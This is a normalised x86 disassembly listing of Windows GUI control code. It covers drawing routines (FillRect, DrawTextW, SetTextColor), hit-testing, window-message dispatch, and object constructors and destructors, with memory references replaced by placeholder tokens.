mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call edi
mov [ esi + 0x84 ] 0x0
sub_42df90
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
push edi
mov esi ecx
jne r-xdata
mov ecx [ esi + 0x18 ]
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ecx
mov ecx esi
call edx
test al al
je r-xdata
xor bl bl
jmp r-xdata
cmp [ esi + 0x25 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x70 ]
mov edi [ CreateSolidBrush@IAT ]
push eax
mov [ esi + 0x88 ] eax
call edi
push 0xffffff
mov [ esi + 0x80 ] eax
call edi
pop edi
mov [ esi + 0x84 ] eax
pop esi
mov al bl
pop ebx
pop ebp
retn 0x4
mov bl 0x1
mov [ esi + 0x25 ] bl
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov eax [ esi + 0x70 ]
mov edx [ eax + 0x8 ]
lea ecx [ esi + 0x70 ]
call edx
sub_42e000
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
cmp [ esi + 0x24 ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0xc
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
push ebx
push edi
mov edi [ esi + 0x4 ]
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x0
call sub_414260
mov eax [ ebp - 0x8 ]
cmp eax [ edi + 0xb4 ]
pop edi
pop ebx
je r-xdata
xor eax eax
mov eax [ eax + 0x10 ]
jmp r-xdata
mov edx [ esi ]
mov edx [ edx + 0x94 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
call edx
sub_42e070
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x2c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x28 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ esp + 0x8 ] eax
mov eax [ eax + 0x8 ]
mov eax [ eax ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov ebx ecx
mov [ esp + 0xc ] eax
test esi esi
jne r-xdata
mov ecx [ ebx + 0x38 ]
sub ecx [ ebx + 0x30 ]
lea edi [ ebx + 0x30 ]
xor eax eax
mov [ esp + 0x30 ] 0x0
cmp [ ebx + 0x27 ] al
jne r-xdata
mov edx [ ebx + 0x80 ]
push edx
lea ecx [ ebx + 0x30 ]
push ecx
push eax
call [ FillRect@IAT ]
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x28 ]
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebx + 0x6c ]
test dl 0x4
jne r-xdata
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
test dl 0x1
je r-xdata
imul eax ecx
mov [ esp + 0x24 ] eax
add eax ecx
mov ecx [ esi + 0x14 ]
mov [ esp + 0x2c ] eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
mov [ esp + 0x2c ] 0x0
call edx
mov eax [ esi + 0x10 ]
mov edx [ esi ]
mov edx [ edx + 0x14 ]
mov [ esp + 0x30 ] eax
mov eax [ ebx + 0x4 ]
movzx ecx [ eax + 0xa9 ]
push ecx
mov ecx [ esp + 0x14 ]
lea eax [ esp + 0x28 ]
push eax
push edi
push ecx
mov ecx esi
call edx
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
mov edx [ edi + 0x8 ]
mov esi [ InflateRect@IAT ]
push 0xfffffffc
mov [ esp + 0x1c ] ecx
mov [ esp + 0x18 ] eax
mov eax [ edi + 0xc ]
push 0xfffffffc
lea ecx [ esp + 0x1c ]
push ecx
mov [ esp + 0x28 ] edx
mov [ esp + 0x2c ] eax
call esi
mov edx [ ebx + 0x84 ]
mov ecx [ esp + 0xc ]
mov edi [ FillRect@IAT ]
push edx
lea eax [ esp + 0x18 ]
push eax
push ecx
call edi
push 0xffffffff
push 0xffffffff
lea edx [ esp + 0x1c ]
push edx
call esi
mov eax [ ebx + 0x80 ]
mov edx [ esp + 0xc ]
push eax
lea ecx [ esp + 0x18 ]
push ecx
push edx
call edi
mov ecx [ esp + 0x34 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
test dl 0x2
je r-xdata
mov eax 0x1
sub_42e1e0
push ebp
mov ebp esp
push 0xffffffff
push sub_445cbb
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
call sub_40e3c0
mov [ ebp - 0x4 ] 0x0
mov [ eax + 0x70 ] r--data
mov cl 0x1
mov [ ebp - 0x4 ] cl
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0x68 ] cl
mov [ ebp - 0x4 ] 0x2
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0xc ] 0xf
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_42e260
push ebp
mov ebp esp
push 0xffffffff
push sub_4459bb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov eax 0x1
mov [ ebp - 0x4 ] eax
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
test [ ebp + 0x8 ] al
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_42e300
push ebp
mov ebp esp
push 0xffffffff
push sub_445cbb
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
call sub_40e3c0
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ eax + 0x70 ] r--data
mov cl 0x1
mov [ ebp - 0x4 ] cl
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0x68 ] cl
mov [ ebp - 0x4 ] 0x2
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0xc ] 0x10
mov [ eax + 0x68 ] dl
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_42e390
push ebp
mov ebp esp
push 0xffffffff
push sub_4459bb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov eax 0x1
mov [ ebp - 0x4 ] eax
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
test [ ebp + 0x8 ] al
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_42e420
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
cmp [ edi + 0x24 ] 0x0
mov [ esp + 0x10 ] eax
je r-xdata
mov ecx [ esp + 0x2c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
cmp [ edi + 0x25 ] 0x0
je r-xdata
cmp [ edi + 0x26 ] 0x0
je r-xdata
mov esi [ edi + 0x4 ]
lea ecx [ esi + 0xb0 ]
lea ebx [ esp + 0x14 ]
lea eax [ esp + 0x18 ]
mov [ esp + 0x14 ] 0x0
call sub_414260
mov eax [ esp + 0x18 ]
cmp eax [ esi + 0xb4 ]
je r-xdata
mov esi [ eax + 0x10 ]
xor ebx ebx
cmp esi ebx
je r-xdata
mov edx [ esi ]
mov eax [ esi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx esi
call edx
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x10 ]
lea eax [ edi + 0x30 ]
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov ebx [ eax + 0x8 ]
sub ebx [ eax ]
mov [ esp + 0x24 ] ecx
mov [ esp + 0x28 ] edx
cmp ecx ebx
jne r-xdata
mov edx [ esi ]
mov edx [ edx + 0x18 ]
jmp r-xdata
mov ecx [ eax + 0xc ]
sub ecx [ eax + 0x4 ]
cmp edx ecx
je r-xdata
mov ecx [ edi + 0x4 ]
movzx ecx [ ecx + 0xa9 ]
push ecx
lea ecx [ esp + 0x20 ]
push ecx
push eax
mov eax [ esp + 0x1c ]
push eax
mov ecx esi
call edx
mov edx [ esi ]
mov edx [ edx + 0x14 ]
sub_42e520
push ebp
mov ebp esp
push 0xffffffff
push sub_445ab8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
call sub_43e350
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_42e5a0
push ebp
mov ebp esp
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
xor eax eax
pop ebp
retn 0x18
mov eax [ ebp + 0xc ]
cmp eax 0x102
jne r-xdata
cmp eax 0xf
jne r-xdata
mov eax [ ecx - 0x74 ]
mov eax [ eax + 0x7c ]
lea edx [ ebp + 0x1c ]
push edx
mov edx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
add ecx 0xffffff8c
push edx
push 0x102
mov [ ebp + 0x1c ] 0x1
call eax
cmp [ ebp + 0x1c ] 0x0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
je r-xdata
cmp eax 0x113
jne r-xdata
mov edx [ ecx - 0x74 ]
mov edx [ edx + 0x80 ]
lea eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
add ecx 0xffffff8c
push eax
push 0xf
mov eax 0x1
pop ebp
retn 0x18
cmp eax 0x204
jne r-xdata
mov edx [ ecx - 0x74 ]
mov edx [ edx + 0x84 ]
lea eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
add ecx 0xffffff8c
push eax
push 0x113
jmp r-xdata
mov eax 0x1
pop ebp
retn 0x18
cmp eax 0x7
jne r-xdata
mov edx [ ecx - 0x74 ]
mov edx [ edx + 0x88 ]
lea eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
add ecx 0xffffff8c
push eax
push 0x204
jmp r-xdata
mov [ ebp + 0x1c ] 0x1
call edx
cmp [ ebp + 0x1c ] 0x0
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
je r-xdata
mov edx [ ecx - 0x74 ]
mov edx [ edx + 0x8c ]
lea eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
add ecx 0xffffff8c
push eax
push 0x7
jmp r-xdata
sub_42e6b0
push ebp
mov ebp esp
push 0xffffffff
push sub_4478a8
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_43e780
mov [ ebp - 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x74 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_42e720
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_42e750
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_42e750
push ebp
mov ebp esp
push 0xffffffff
push sub_447878
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x74 ] r--data
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov eax [ esi + 0xa4 ]
mov edi [ DeleteObject@IAT ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0xa0 ]
cmp eax ebx
je r-xdata
push eax
call edi
mov [ esi + 0xa4 ] ebx
mov eax [ esi + 0x9c ]
cmp eax ebx
je r-xdata
push eax
call edi
mov [ esi + 0xa0 ] ebx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_43e900
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
call edi
mov [ esi + 0x9c ] ebx
sub_42e820
push ebp
mov ebp esp
push 0xffffffff
push sub_44793e
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_40e3c0
xor edi edi
mov [ ebp - 0x4 ] edi
mov [ esi + 0x70 ] r--data
mov al 0x1
mov [ ebp - 0x4 ] al
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x68 ] al
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea ebx [ esi + 0x78 ]
mov ecx rw-data
mov [ ebp - 0x10 ] ebx
call edx
add eax 0x10
mov [ ebx ] eax
mov [ ebp - 0x4 ] 0x4
mov [ esi + 0x7c ] edi
mov [ esi + 0x80 ] edi
mov [ esi + 0x84 ] edi
mov [ esi + 0x88 ] edi
mov [ esi + 0xc ] 0x16
mov [ esi + 0x74 ] edi
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42e8e0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_42e910
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_42e910
push ebp
mov ebp esp
push 0xffffffff
push sub_445a8e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x78 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x3
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_42e9c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x74 ] eax
mov [ esi + 0x6c ] 0x0
test eax eax
je r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
mov eax [ esi + 0x1c ]
push 0x0
push rw-data
push rw-data
push 0x0
push eax
call __RTDynamicCast
add esp 0x14
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x25 ] 0x0
je r-xdata
mov ecx [ esi + 0x8 ]
push ecx
push eax
call sub_42b550
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_42ea40
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
push ecx
mov ecx esi
call sub_40e4c0
cmp [ esi + 0x25 ] 0x0
jne r-xdata
pop esi
pop ebp
retn 0x8
mov eax [ esi + 0x4 ]
push edi
add eax 0x98
lea edi [ esi + 0x78 ]
call sub_401760
pop edi
sub_42ea80
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push eax
push edx
add ecx 0x30
push ecx
call [ PtInRect@IAT ]
test eax eax
setne al
mov esp ebp
pop ebp
retn 0xc
sub_42eab0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x44
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
cmp [ esi + 0x24 ] 0x0
push edi
mov [ esp + 0x14 ] eax
je r-xdata
mov ecx [ esp + 0x4c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov edi [ esi + 0x4 ]
lea ecx [ edi + 0xb0 ]
lea ebx [ esp + 0x18 ]
lea eax [ esp + 0x10 ]
mov [ esp + 0x18 ] 0x0
call sub_414260
mov eax [ esp + 0x10 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
je r-xdata
xor eax eax
cmp [ esi + 0x27 ] al
je r-xdata
cmp [ esi + 0x74 ] 0x0
mov eax 0x3
je r-xdata
cmp [ esi + 0x74 ] eax
je r-xdata
mov edi [ esi + 0x6c ]
mov edx [ ebx ]
mov edx [ edx + 0xc ]
shr edi 0x1
add edi eax
mov eax [ ebx + 0x14 ]
push eax
mov ecx ebx
call edx
mov eax [ ebx + 0xc ]
cdq
and edx 0x7
add eax edx
mov edx [ ebx + 0x10 ]
sar eax 0x3
mov ecx eax
imul ecx edi
lea edi [ ecx + eax ]
mov eax [ esi + 0x30 ]
mov [ esp + 0x1c ] eax
mov eax [ esi + 0x34 ]
mov [ esp + 0x20 ] eax
mov eax [ esi + 0x38 ]
mov [ esp + 0x24 ] eax
mov eax [ esi + 0x3c ]
sub eax edx
sub eax [ esp + 0x20 ]
mov [ esp + 0x10 ] edx
mov [ esp + 0x38 ] edx
cdq
sub eax edx
mov edx eax
mov eax [ esp + 0x20 ]
mov [ esp + 0x2c ] ecx
mov [ esp + 0x34 ] edi
sub edi ecx
mov ecx [ esp + 0x10 ]
add edi [ esp + 0x1c ]
sar edx 0x1
add eax edx
add ecx eax
mov [ esp + 0x20 ] eax
push 0x1
mov [ esp + 0x2c ] ecx
lea eax [ esp + 0x30 ]
push eax
mov [ esp + 0x2c ] edi
mov edi [ esp + 0x1c ]
lea ecx [ esp + 0x24 ]
mov [ esp + 0x38 ] 0x0
mov edx [ ebx ]
mov edx [ edx + 0x14 ]
push ecx
push edi
mov ecx ebx
call edx
mov eax [ esi + 0x78 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax 0x7
mov eax 0x4
jmp r-xdata
mov edx [ esi + 0x38 ]
mov ecx [ esi + 0x34 ]
mov eax [ esi + 0x30 ]
mov [ esp + 0x24 ] edx
mov edx [ esp + 0x34 ]
sub edx [ esp + 0x2c ]
cmp [ esi + 0x74 ] 0x0
mov [ esp + 0x20 ] ecx
mov ecx [ esi + 0x3c ]
lea eax [ eax + edx + 0x4 ]
mov edx [ esi + 0x34 ]
mov [ esp + 0x28 ] ecx
mov ecx [ esi + 0x30 ]
mov [ esi + 0x7c ] ecx
mov [ esi + 0x80 ] edx
mov edx [ esi + 0x3c ]
mov [ esi + 0x88 ] edx
mov [ esp + 0x1c ] eax
mov [ esi + 0x84 ] eax
mov eax [ edi + 0x8 ]
mov edi [ eax ]
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x80 ]
je r-xdata
cmp [ esi + 0x27 ] 0x0
jne r-xdata
mov ecx [ eax + 0x84 ]
push ecx
push edi
call [ SetTextColor@IAT ]
mov ecx [ esi + 0x4 ]
mov [ esp + 0x14 ] eax
mov eax [ ecx + 0xa0 ]
test eax eax
jne r-xdata
mov ecx [ eax + 0x8c ]
mov ebx [ SelectObject@IAT ]
push eax
push edi
call ebx
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x1c ]
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x20 ]
push 0x624
mov [ esp + 0x44 ] eax
lea eax [ esp + 0x40 ]
push eax
mov [ esp + 0x4c ] ecx
mov ecx [ esi + 0x78 ]
push 0xffffffff
mov [ esp + 0x48 ] edx
mov edx [ esp + 0x34 ]
push ecx
push edi
mov [ esp + 0x5c ] edx
call [ DrawTextW@IAT ]
mov edx [ esp + 0x44 ]
mov ecx [ esi + 0x78 ]
sub edx [ esp + 0x3c ]
push 0x224
add [ esi + 0x84 ] edx
lea eax [ esp + 0x20 ]
push eax
push 0xffffffff
push ecx
push edi
call [ DrawTextW@IAT ]
mov edx [ esp + 0x14 ]
push edx
push edi
call [ SetTextColor@IAT ]
mov eax [ esp + 0x10 ]
push eax
push edi
call ebx
mov eax [ rw-data ]
sub_42ed20
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi - 0x70 ]
mov edx [ eax + 0x78 ]
lea ebx [ edi - 0x70 ]
mov ecx ebx
call edx
test al al
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp + 0xc ]
cmp eax 0x2a3
jne r-xdata
cmp eax 0x20
jne r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x80 ]
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0x8 ]
push ecx
push edx
mov ecx ebx
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
lea ecx [ eax - 0x200 ]
cmp ecx 0xe
ja r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
mov edx [ ebx ]
mov edx [ edx + 0x84 ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
mov ecx [ ebp + 0x8 ]
push eax
push ecx
mov ecx ebx
call edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
cmp [ edi - 0x49 ] 0x0
jne r-xdata
mov esi [ ebp + 0x14 ]
mov edx esi
shr edx 0x10
movsx ecx dx
movsx eax si
push ecx
push eax
add edi 0xc
push edi
call [ PtInRect@IAT ]
mov ecx [ ebp + 0xc ]
sub ecx 0x200
je r-xdata
cmp eax 0x200
jne r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ ebx ]
mov edx [ edx + 0x7c ]
push ecx
mov ecx [ ebp + 0x10 ]
push esi
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
push eax
mov ecx ebx
call edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
dec ecx
je r-xdata
test eax eax
je r-xdata
dec ecx
jne r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebx ]
push ecx
mov ecx [ ebp + 0x8 ]
push esi
push edx
mov edx [ eax + 0x8c ]
push ecx
mov ecx ebx
call edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
test eax eax
je r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebx ]
push ecx
mov ecx [ ebp + 0x8 ]
push esi
push edx
mov edx [ eax + 0x88 ]
push ecx
mov ecx ebx
call edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_42ee60
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi ecx
mov eax [ esi + 0x6c ]
je r-xdata
test al 0x6
je r-xdata
test al 0x6
jne r-xdata
xor eax eax
pop esi
pop ebp
retn 0x14
and eax 0xfffffff9
cmp [ esi + 0x27 ] 0x0
mov [ esi + 0x6c ] eax
je r-xdata
mov eax [ ebp + 0x18 ]
mov [ eax ] 0x1
mov eax 0x1
pop esi
pop ebp
retn 0x14
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax esi
call sub_426dd0
or [ esi + 0x6c ] 0x2
cmp [ esi + 0x27 ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x3c ]
push esi
call edx
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x6c ]
cmp [ ecx - 0xc ] 0x0
je r-xdata
mov eax esi
call sub_426dd0
mov eax [ ebp + 0x14 ]
mov ecx [ esi + 0x1c ]
mov edx [ ecx ]
mov edx [ edx + 0x38 ]
push 0x1
push eax
mov eax [ ebp + 0x10 ]
push eax
push 0x200
call edx
sub_42eef0
mov eax ecx
mov ecx [ eax + 0x6c ]
test cl 0x6
je r-xdata
xor eax eax
retn 0x10
and ecx 0xfffffff9
cmp [ eax + 0x24 ] 0x0
mov [ eax + 0x6c ] ecx
je r-xdata
cmp [ eax + 0x25 ] 0x0
je r-xdata
cmp [ eax + 0x26 ] 0x0
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
cmp [ edx + 0xab ] 0x0
push esi
mov esi [ ecx ]
sete dl
movzx edx dl
push 0x0
push edx
push eax
mov eax [ esi + 0x20 ]
call eax
pop esi
sub_42ef40
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x14 ]
mov [ ecx ] 0x1
mov ecx 0x4
test [ eax + 0x6c ] cl
jne r-xdata
xor eax eax
pop ebp
retn 0x10
cmp [ eax + 0x24 ] 0x0
mov [ eax + 0x6c ] ecx
je r-xdata
cmp [ eax + 0x25 ] 0x0
je r-xdata
cmp [ eax + 0x26 ] 0x0
je r-xdata
mov ecx [ eax + 0x1c ]
test ecx ecx
je r-xdata
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
cmp [ edx + 0xab ] 0x0
push esi
mov esi [ ecx ]
sete dl
movzx edx dl
push 0x0
push edx
push eax
mov eax [ esi + 0x20 ]
call eax
pop esi
sub_42efa0
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x74 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebp
retn 0x10
cmp [ esi + 0x24 ] 0x0
mov [ esi + 0x74 ] 0x1
mov [ esi + 0x6c ] 0x2
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
cmp [ esi + 0x25 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x90 ]
mov ecx esi
call eax
mov ecx [ ebp + 0x14 ]
mov [ ecx ] 0x1
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
xor edx edx
cmp [ esi + 0x74 ] edx
setne dl
push edx
mov edx [ esi + 0x8 ]
push edx
push 0x111
push esi
call eax
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ eax + 0xab ] 0x0
mov edx [ ecx ]
mov edx [ edx + 0x20 ]
sete al
movzx eax al
push 0x0
push eax
push esi
call edx
sub_42f030
mov eax ecx
cmp [ eax + 0x1c ] 0x0
je r-xdata
retn
mov ecx [ eax + 0x1c ]
mov edx [ ecx ]
push esi
mov esi [ eax + 0x8 ]
push 0x0
push esi
push 0x500
push eax
